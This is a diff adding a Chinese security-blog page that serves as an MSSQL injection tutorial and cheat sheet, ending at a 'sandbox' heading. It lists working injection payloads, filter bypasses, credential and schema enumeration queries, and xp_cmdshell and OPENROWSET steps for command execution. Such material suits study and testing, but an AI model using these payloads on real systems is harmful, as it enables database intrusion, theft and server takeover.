@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <title>
+        
+          MSSQL注入攻击与防御 - Rootclay
+        
+    </title>
+
+    <link rel="canonical" href="http://rootclay.github.io/2017/05/04/MSSQL注入攻击与防御/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS --> 
+    <link rel="stylesheet" href="/css/beantech.min.css">
+    
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <link rel="stylesheet" href="/css/widget.css">
+
+    <link rel="stylesheet" href="/css/rocket.css">
+
+    <link rel="stylesheet" href="/css/signature.css">
+
+    <link rel="stylesheet" href="/css/toc.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            background-image: url('header.png')
+            /*post*/
+        
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#Web" title="Web">Web</a>
+                            
+                              <a class="tag" href="/tags/#SQL" title="SQL">SQL</a>
+                            
+                        </div>
+                        <h1>MSSQL注入攻击与防御</h1>
+                        <h2 class="subheading">总结一下在MSSQL注入中的攻击与防御.</h2>
+                        <span class="meta">
+                            Posted by Rootclay on
+                            2017-05-04
+                        </span>
+                    </div>
+                
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">ROOTCLAY</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Modify by Yu-Hsuan Yen -->
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="mssql注入攻击与防御">MSSQL注入攻击与防御</h1>
+<p>author:rootclay@syclover</p>
+<blockquote>
+<p>上一篇投稿在安全客的文章已经为大家推出了<a href="http://bobao.360.cn/learning/detail/3758.html" target="_blank" rel="external">MySQL注入攻击与防御</a>，这里再写一下MSSQL注入攻击与防御，同样对与错误的地方希望大家指出共同进步<br>
+本文所用数据库涉及SQL Server 2k5,2k8,2k12,其次对于绕过姿势和前文并无太大差别,就不做过多的讲解,主要放在后面的提权上</p>
+</blockquote>
+<h2 id="系统库">系统库</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">库名</th>
+<th style="text-align:left">解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">master</td>
+<td style="text-align:left">master数据库控制SQL Server的所有方面。这个数据库中包括所有的配置信息、用户登录信息、当前正在服务器中运行的过程的信息。</td>
+</tr>
+<tr>
+<td style="text-align:left">model</td>
+<td style="text-align:left">model数据库是建立所有用户数据库时的模板。当你建立一个新数据库时，SQL Server会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满。</td>
+</tr>
+<tr>
+<td style="text-align:left">tempdb</td>
+<td style="text-align:left">tempdb数据库是一个非常特殊的数据库，供所有来访问你的SQL Server的用户使用。这个库用来保存所有的临时表、存储过程和其他SQL Server建立的临时用的东西。例如，排序时要用到tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建。永远不要在tempdb数据库建立需要永久保存的表。</td>
+</tr>
+<tr>
+<td style="text-align:left"></td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">msdb</td>
+<td style="text-align:left">msdb数据库是SQL Server中的一个特例。如果你查看这个数据库的实际定义，会发现它其实是一个用户数据库。不同之处是SQL Server拿这个数据库来做什么。所有的任务调度、报警、操作员都存储在msdb数据库中。该库的另一个功能是用来存储所有备份历史。SQL Server Agent将会使用这个库。</td>
+</tr>
+</tbody>
+</table>
+<h2 id="注释">注释</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">库名</th>
+<th style="text-align:left">解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">/*</td>
+<td style="text-align:left">C注释风格</td>
+</tr>
+<tr>
+<td style="text-align:left">–</td>
+<td style="text-align:left">SQL注释风格</td>
+</tr>
+<tr>
+<td style="text-align:left">;%00</td>
+<td style="text-align:left">空字节</td>
+</tr>
+</tbody>
+</table>
+<p>实例:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">WHERE</span> username = <span class="string">''</span> <span class="keyword">OR</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">--' AND password = '';</span></div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="string">''</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span><span class="comment">/*';</span></div></pre></td></tr></table></figure>
+<h2 id="版本amp数据库当前用户amp主机名">版本&amp;数据库当前用户&amp;主机名</h2>
+<h3 id="版本">版本</h3>
+<p><code>select @@VERSION</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">如果是2012的数据库返回为True</div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="string">'1'</span> <span class="keyword">AND</span> @@<span class="keyword">VERSION</span> <span class="keyword">LIKE</span> <span class="string">'%2012%'</span>;</div></pre></td></tr></table></figure>
+<h3 id="数据库当前用户">数据库当前用户</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">解释</th>
+<th style="text-align:left">代码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">查询用户</td>
+<td style="text-align:left">select name, loginame from master…syslogins, master…sysprocesses</td>
+</tr>
+<tr>
+<td style="text-align:left">当前用户</td>
+<td style="text-align:left">user, system_user, suser_sname(), is_srvrolemember(‘sysadmin’)</td>
+</tr>
+<tr>
+<td style="text-align:left">用户密码</td>
+<td style="text-align:left">SELECT user, password FROM master.dbo.syslogins</td>
+</tr>
+</tbody>
+</table>
+<p>实例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Return current user:</div><div class="line"><span class="keyword">SELECT</span> loginame <span class="keyword">FROM</span> master..sysprocesses <span class="keyword">WHERE</span> spid=@@SPID;</div><div class="line"></div><div class="line"><span class="keyword">Check</span> <span class="keyword">if</span> <span class="keyword">user</span> <span class="keyword">is</span> <span class="keyword">admin</span>:</div><div class="line"><span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (IS_SRVROLEMEMBER(<span class="string">'sysadmin'</span>)=<span class="number">1</span>) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>);</div></pre></td></tr></table></figure>
+<h3 id="主机名">主机名</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> @@SERVERNAME</div></pre></td></tr></table></figure>
+<h2 id="库amp表amp列">库&amp;表&amp;列</h2>
+<h3 id="库名">库名</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">解释</th>
+<th style="text-align:left">代码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">查询库名</td>
+<td style="text-align:left">select name from master…sysdatabases</td>
+</tr>
+<tr>
+<td style="text-align:left">查询库名</td>
+<td style="text-align:left">select	DB_NAME(i)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="测试列数">测试列数</h3>
+<p><code>ORDER BY n+1;</code><br>
+实例:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">query: <span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="string">'1'</span>;</div><div class="line"></div><div class="line">1' ORDER BY 1<span class="comment">--	True</span></div><div class="line">1' ORDER BY 2<span class="comment">--	True</span></div><div class="line">1' ORDER BY 3<span class="comment">--	False - 查询使用了2列</span></div><div class="line">-1' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">--	True</span></div></pre></td></tr></table></figure>
+<p><code>GROUP BY / HAVING</code></p>
+<p>实例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">query: <span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="string">'1'</span>;</div><div class="line"></div><div class="line">1' HAVING 1=1										<span class="comment">-- 错误</span></div><div class="line">1' GROUP BY username HAVING 1=1<span class="comment">--					-- 错误</span></div><div class="line">1' GROUP BY username, password HAVING 1=1<span class="comment">--			-- 正确</span></div><div class="line"></div><div class="line">Group By可以用来测试列名</div></pre></td></tr></table></figure>
+<h3 id="获取表名">获取表名</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">UNION查询</th>
+<th style="text-align:left">BLIND查询</th>
+<th style="text-align:left">报错查询</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">UNION SELECT name FROM master…sysobjects WHERE xtype=‘U’</td>
+<td style="text-align:left">AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables &gt; ‘A’</td>
+<td style="text-align:left">AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)<br><br>AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))</td>
+</tr>
+</tbody>
+</table>
+<p><strong>这里使用的U表示用户表，还有视图和存储过程分别表示为    U = 用户表, V = 视图 , X = 扩展存储过程</strong></p>
+<h3 id="获取列名">获取列名</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">UNION查询</th>
+<th style="text-align:left">BLIND查询</th>
+<th style="text-align:left">报错查询</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">UNION SELECT name FROM master…syscolumns WHERE id = (SELECT id FROM master…syscolumns WHERE name = ‘tablename’)</td>
+<td style="text-align:left">AND SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns &gt; ‘A’</td>
+<td style="text-align:left">AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns)<br><br>AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))</td>
+</tr>
+</tbody>
+</table>
+<h4 id="接收多条数据">接收多条数据</h4>
+<h5 id="临时表">临时表</h5>
+<p>除了上述的查询方式在MSSQL中可以使用临时表来查看数据,步骤如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//1.创建临时表/列和插入数据：</div><div class="line"><span class="keyword">BEGIN</span> <span class="keyword">DECLARE</span> @<span class="keyword">test</span> <span class="built_in">varchar</span>(<span class="number">8000</span>) <span class="keyword">SET</span> @<span class="keyword">test</span>=<span class="string">':'</span> <span class="keyword">SELECT</span> @<span class="keyword">test</span>=@<span class="keyword">test</span>+<span class="string">' '</span>+<span class="keyword">name</span> <span class="keyword">FROM</span> sysobjects <span class="keyword">WHERE</span> xtype=<span class="string">'U'</span> <span class="keyword">AND</span> <span class="keyword">name</span>&gt;@<span class="keyword">test</span> <span class="keyword">SELECT</span> @<span class="keyword">test</span> <span class="keyword">AS</span> <span class="keyword">test</span> <span class="keyword">INTO</span> TMP_DB <span class="keyword">END</span>;</div><div class="line">//2.转储内容：</div><div class="line"><span class="keyword">SELECT</span> TOP <span class="number">1</span> <span class="keyword">SUBSTRING</span>(<span class="keyword">test</span>,<span class="number">1</span>,<span class="number">353</span>) <span class="keyword">FROM</span> TMP_DB;</div><div class="line">//3.删除表：</div><div class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> TMP_DB;</div></pre></td></tr></table></figure>
+<h5 id="xml列数据">XML列数据</h5>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">FOR</span> <span class="keyword">XML</span> <span class="keyword">PATH</span>(<span class="string">''</span>)</div></pre></td></tr></table></figure>
+<h3 id="字符串连接符">字符串连接符</h3>
+<p>相对于MySQL来说少了两个函数,有如下方式连接:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'a'</span>,<span class="string">'a'</span>,<span class="string">'a'</span>); (SQL SERVER 2012)</div><div class="line"><span class="keyword">SELECT</span> <span class="string">'a'</span>+<span class="string">'d'</span>+<span class="string">'mi'</span>+<span class="string">'n'</span>;</div></pre></td></tr></table></figure>
+<h3 id="条件语句amp时间">条件语句&amp;时间</h3>
+<h4 id="条件语句">条件语句</h4>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">IF...ELSE...//注意IF是不能再<span class="keyword">SELECT</span>语句中使用的</div><div class="line">CASE...WHEN...ELSE...</div></pre></td></tr></table></figure>
+<p>实例:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">IF 1=1 <span class="keyword">SELECT</span> <span class="string">'true'</span> <span class="keyword">ELSE</span> <span class="keyword">SELECT</span> <span class="string">'false'</span>;</div><div class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">THEN</span> <span class="literal">true</span> <span class="keyword">ELSE</span> <span class="literal">false</span> <span class="keyword">END</span>;</div></pre></td></tr></table></figure>
+<h4 id="时间">时间</h4>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">WAITFOR DELAY &apos;time_to_pass&apos;;</div><div class="line">WAITFOR TIME &apos;time_to_execute&apos;;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">IF 1=1 WAITFOR DELAY &apos;0:0:5&apos; ELSE WAITFOR DELAY &apos;0:0:0&apos;;//这里表示,如果条件成立,延迟5s</div></pre></td></tr></table></figure>
+<h2 id="文件">文件</h2>
+<h3 id="查看文件权限">查看文件权限</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mydata (line <span class="built_in">varchar</span>(<span class="number">8000</span>));</div><div class="line">BULK <span class="keyword">INSERT</span> mydata <span class="keyword">FROM</span> ‘c:boot.ini’;</div><div class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> mydata;</div></pre></td></tr></table></figure>
+<h3 id="定位数据库文件">定位数据库文件</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXEC sp_helpdb master; –location of master.mdf</div></pre></td></tr></table></figure>
+<h2 id="绕过技巧">绕过技巧</h2>
+<p>这里讲绕过技巧的话其实很多和MySQL的绕过姿势都是类似的,就举几个常见的,其他的可以参见前面的<a href="http://bobao.360.cn/learning/detail/3758.html" target="_blank" rel="external">MySQL注入攻击与防御</a></p>
+<h3 id="绕过引号">绕过引号</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">Users</span> <span class="keyword">WHERE</span> username = <span class="built_in">CHAR</span>(<span class="number">97</span>) + <span class="built_in">CHAR</span>(<span class="number">100</span>) + <span class="built_in">CHAR</span>(<span class="number">109</span>) + <span class="built_in">CHAR</span>(<span class="number">105</span>) + <span class="built_in">CHAR</span>(<span class="number">110</span>)</div></pre></td></tr></table></figure>
+<h3 id="16进制转换绕过">16进制转换绕过</h3>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">' AND 1=0; <span class="keyword">DECLARE</span> @S <span class="built_in">VARCHAR</span>(<span class="number">4000</span>) <span class="keyword">SET</span> @S=<span class="keyword">CAST</span>(<span class="number">0x44524f50205441424c4520544d505f44423b</span> <span class="keyword">AS</span> <span class="built_in">VARCHAR</span>(<span class="number">4000</span>)); EXEC (@S);<span class="comment">--</span></div></pre></td></tr></table></figure>
+<h2 id="mssql提权">MSSQL提权</h2>
+<p>这里先推荐一个工具<a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="external">PowerUpSQL</a>,主要用于对SQL Server的攻击,还能快速清点内网中SQL Server的机器,更多的信息可以到GitHub上查看使用.</p>
+<p>其次下面主要讲的一些提权姿势为存储过程提权,想要查看数据库中是否有对应的存储过程,可以用下面的语句:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> master.dbo.sysobjects <span class="keyword">where</span> xtype=<span class="string">'x'</span> <span class="keyword">and</span> <span class="keyword">name</span>=<span class="string">'xp_cmdshell'</span></div></pre></td></tr></table></figure>
+<p>或者查询对应数据库中定义的存储过程有哪些:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> ROUTINE_CATALOG,SPECIFIC_SCHEMA,ROUTINE_NAME,ROUTINE_DEFINITION</div><div class="line"><span class="keyword">FROM</span> MASTER.INFORMATION_SCHEMA.ROUTINES</div><div class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> ROUTINE_NAME</div></pre></td></tr></table></figure>
+<p>推荐一篇文章,是关于证书登录提权的<a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/" target="_blank" rel="external">文章</a></p>
+<h3 id="xp_cmdshell">xp_cmdshell</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXEC master.dbo.xp_cmdshell &apos;cmd&apos;;</div></pre></td></tr></table></figure>
+<p>最为经典的就是这个组件了,但是2005之后就默认关闭,而且现在来说都会把这个扩展删除掉</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">激活命令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">1.EXEC sp_configure ‘show advanced options’, 1</td>
+</tr>
+<tr>
+<td style="text-align:left">2.EXEC sp_configure reconfigure</td>
+</tr>
+<tr>
+<td style="text-align:left">3.EXEC sp_configure ‘xp_cmdshell’, 1</td>
+</tr>
+<tr>
+<td style="text-align:left">4.EXEC sp_configure reconfigure</td>
+</tr>
+</tbody>
+</table>
+<p>因为xp_cmdshell用得最多,这里就xp_cmdshell使用过程中可能遇到的和网上收集问题列举一下:</p>
+<p>首先说明一下,下面用到的<code>addextendedproc</code>的时候是没有开启的,试了一些语句,下面的语句可以创建一个存储过程:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">use</span> <span class="keyword">master</span></div><div class="line"><span class="keyword">go</span></div><div class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> sp_addextendedproc</div><div class="line">@functname <span class="keyword">nvarchar</span>(<span class="number">517</span>),</div><div class="line">@dllname <span class="built_in">varchar</span>(<span class="number">255</span>)</div><div class="line"><span class="keyword">as</span></div><div class="line"><span class="keyword">set</span> implicit_transactions <span class="keyword">off</span></div><div class="line"><span class="keyword">if</span> @@trancount &gt; <span class="number">0</span></div><div class="line"><span class="keyword">begin</span></div><div class="line">raiserror(<span class="number">15002</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="string">'sp_addextendedproc'</span>)</div><div class="line"><span class="keyword">return</span> (<span class="number">1</span>)</div><div class="line"><span class="keyword">end</span></div><div class="line">dbcc addextendedproc( @functname, @dllname)</div><div class="line"><span class="keyword">return</span> (<span class="number">0</span>)</div></pre></td></tr></table></figure>
+<ol>
+<li>未能找到存储过程’master…xpcmdshell’.<br>
+恢复方法：</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll' <span class="keyword">declare</span> @o <span class="built_in">int</span> </div><div class="line">EXEC sp_addextendedproc <span class="string">'xp_cmdshell'</span>, <span class="string">'xpsql70.dll'</span></div></pre></td></tr></table></figure>
+<ol start="2">
+<li>无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）<br>
+恢复方法：</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">EXEC sp_dropextendedproc "xp_cmdshell"</div><div class="line">EXEC sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'</div></pre></td></tr></table></figure>
+<ol start="3">
+<li>无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)<br>
+恢复方法：</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">exec sp_dropextendedproc 'xp_cmdshell'</div><div class="line">exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll'</div></pre></td></tr></table></figure>
+<ol start="4">
+<li>SQL Server 阻止了对组件 ‘xp_cmdshell’ 的 过程’sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 ‘xp_cmdshell’。有关启用 ‘xp_cmdshell’ 的详细信息，请参阅 SQL Server 联机丛书中的 “外围应用配置器”。<br>
+恢复方法：</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">执行:EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">', 1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell<span class="string">', 1;RECONFIGURE;</span></div></pre></td></tr></table></figure>
+<h3 id="xp_dirtree">xp_dirtree</h3>
+<p>获取文件信息,可以列举出目录下所有的文件与文件夹<br>
+参数说明:目录名,目录深度,是否显示文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">execute</span> master..xp_dirtree <span class="string">'c:'</span> </div><div class="line"><span class="keyword">execute</span> master..xp_dirtree <span class="string">'c:'</span>,<span class="number">1</span> </div><div class="line"><span class="keyword">execute</span> master..xp_dirtree <span class="string">'c:'</span>,<span class="number">1</span>,<span class="number">1</span></div></pre></td></tr></table></figure>
+<h3 id="openrowset">OPENROWSET</h3>
+<p>OPENROWSET 在MSSQL 2005及以上版本中默认是禁用的.需要先打开:<br>
+打开语句:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">激活命令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">1.EXEC sp_configure ‘show advanced options’, 1</td>
+</tr>
+<tr>
+<td style="text-align:left">2.EXEC sp_configure reconfigure</td>
+</tr>
+<tr>
+<td style="text-align:left">3.EXEC sp_configure ‘Ad Hoc Distributed Queries’, 1</td>
+</tr>
+<tr>
+<td style="text-align:left">4.EXEC sp_configure reconfigure</td>
+</tr>
+</tbody>
+</table>
+<p>然后执行:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> OPENROWSET(<span class="string">'SQLOLEDB'</span>, <span class="string">'数据库地址'</span>;'数据库用户名';'数据库密码', '<span class="keyword">SET</span> FMTONLY <span class="keyword">OFF</span> <span class="keyword">execute</span> master..xp_cmdshell <span class="string">"dir"</span><span class="string">');</span></div></pre></td></tr></table></figure>
+<p>这种攻击是需要首先知道用户密码的.</p>
+<h3 id="沙盒">沙盒</h3>
